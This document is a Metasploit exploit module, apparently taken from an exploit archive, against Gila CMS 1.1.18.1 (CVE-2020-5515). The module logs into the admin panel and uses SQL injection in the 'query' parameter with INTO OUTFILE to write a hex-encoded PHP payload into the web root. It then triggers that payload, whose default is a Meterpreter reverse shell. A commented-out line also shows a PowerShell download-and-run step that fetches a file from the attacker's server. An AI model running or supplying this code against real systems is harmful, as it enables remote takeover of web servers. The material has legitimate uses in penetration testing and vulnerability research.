##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
    require 'msf/core'
    require "net/http"
    require "uri"
    require 'nokogiri'
 
 
    class MetasploitModule < Msf::Exploit
  Rank = ExcellentRanking
 
   
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Exploit::EXE      
         
 
        def initialize(info = {})
            super(update_info(info,
                'Name'           => 'Gila CMS  1.1.18.1 Shell Upload ',
                'Description'    => %q{
               This module exploits sql injection vulnerability in "query" parameter that found on  Gila CMS 1.1.18.1 .  
                },
                'Author'         => [ 'th3d1gger','Carlos Ramirez L. (BillyV4)' ],
                'References' =>
              [
                
                ['CVE', 'CVE-2020-5515'],
                ['PACKETSTORM', '158114']
                
              ], 
                'License'        => 'MSF_LICENSE',
          'Platform'       => 'PHP',
          'Arch' => ARCH_PHP,

          'Targets'        =>
            [
              [
                  'Automatic (PHP In-Memory)',
                  'Platform' => 'php',
                  'Arch' => ARCH_PHP,
                  'Type' => :php_memory,
                  'Payload' => { 'BadChars' => "'" },
                  'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' }
                ],
            ],
          'DefaultTarget'  => 0 ))
            register_options(
                [
                    OptString.new('USERNAME', [ true, 'Email to login with', 'user@gilacms.com']),
 
              OptString.new('PASSWORD', [ true, 'Password to login with', 'password']),
              OptString.new('TARGETURI', [ true, 'Uri for Gila CMS base', '/gila-1.11.8/']),
 		OptString.new('TARGETPATH', [ true, 'Full Path to shell upload', "C://xampp3//htdocs//gila-1.11.8//"])#,
 		  
                 
                ], self.class)
        #      OptAddress.new('SRVHOST', [true, 'HTTP Server Bind Address', '127.0.0.1']),
          #          OptInt.new('SRVPORT', [true, 'HTTP Server Bind Port', '4554']),
 	#	OptString.new('FILENAME', [true, 'Payload filename', 'payloader.elf'])
 	
        end
       
  def primer
  end
    
        def username
          datastore['USERNAME']
    end
 
    def password
            datastore['PASSWORD']
    end
 
 #some serving things
#	def on_request_uri(cli, req)
 #           @pl = generate_payload_exe
  #  	    print_status("#{peer} - Payload request received: #{req.uri}")
   #         send_response(cli, @pl)
    #	end 
 
        def gila

uri = URI.parse('http://'+rhost.to_s+':'+rport.to_s+datastore['targeturi'].to_s+'/admin')
http = Net::HTTP.new(uri.host, uri.port)

request = Net::HTTP::Get.new(uri.request_uri)
 
response = http.request(request)

cookies = response.response['set-cookie']
cookies = cookies.split(';')[0]


request = Net::HTTP::Post.new(uri)
request.set_form_data({"username" => username, "password" => password})
 


request['Cookie'] = cookies

request['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36'
response = http.request(request)
 
 
 
    if response && response.body.include?("Dashboard")
       
    	  print_good("yayayay! Authenticated with #{username}:#{password}")
    	gsessionid = response.response['set-cookie']

 
 
     
     
    	@fname = "#{rand_text_alphanumeric(rand(10)+6)}.PHP"
 #for windows  	php = "<?php shell_exec('powershell -c \"Invoke-WebRequest -Uri http://"+srvhost+":"+srvport.to_s+"/"+filename+" -OutFile "+ datastore['targetpath']+"assets//"+filename+ "   \"'); shell_exec('"+datastore['targetpath']+"assets//"+filename+"') ?>"

	#bypass strip_tags 
  	php = "<?php #{payload.encoded} ?>"
  	php = php.each_byte.map { |b| b.to_s(16) }.join
	php = "0x"+php	
	uri = URI.parse('http://'+rhost.to_s+':'+rport.to_s+datastore['targeturi'].to_s+'/admin/sql?query=SELECT id FROM user LIMIT 0,1 INTO OUTFILE  \''+datastore['targetpath'] +"assets//"+@fname+'\' LINES TERMINATED BY   '+php+'')

	request = Net::HTTP::Get.new(uri)
	
	request['Cookie'] = cookies+';'+ gsessionid.split(';')[0]+';'

	request['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36'
	response = http.request(request)
	if response.body.include?('Page created in')
#Another  serving things
	
   #resource_uri="/"+filename
   #start_service({'Uri' => {
  #      	    'Proc' => Proc.new { |cli, req|
#	             on_request_uri(cli, req)},
#	             'Path' => resource_uri
#	          }})
 #             print_status("#{rhost}:#{rport} - Trying Exploitation in 2 requests...")

  
        
      	print_status("Payload uploaded")
        print_status("#{@fname}")
    	print_status("#{peer} - Executing #{@fname}...")

    	uri = URI.parse('http://'+rhost.to_s+':'+rport.to_s+datastore['targeturi'].to_s+'assets/'+@fname)

   	 http = Net::HTTP.new(uri.host, uri.port)
 
	
    	request = Net::HTTP::Get.new(uri.request_uri)
 
    	response = http.request(request)
    	print_status("Payload is on #{uri} You can trigger it by yourself if it doesn't work.")
        #and things about server 
        #print_status("#{srvhost}:#{srvport} - Waiting 1 minute for shell")
        #      sleep(60)
    
	else
	print_status("Payload can not be uploaded")
	print response.body
	end
    else
 #     print_status(response.body)
      fail_with(Failure::NoAccess, 'Credentials are not valid.')
    end
 
     
  end
 
        
 
        def exploit
   
   gila
 
      if gila.nil?
        fail_with(Failure::Unknown, 'Something went wrong!')
      end
      end
     end
 
#  0day.today [2020-06-16]  #
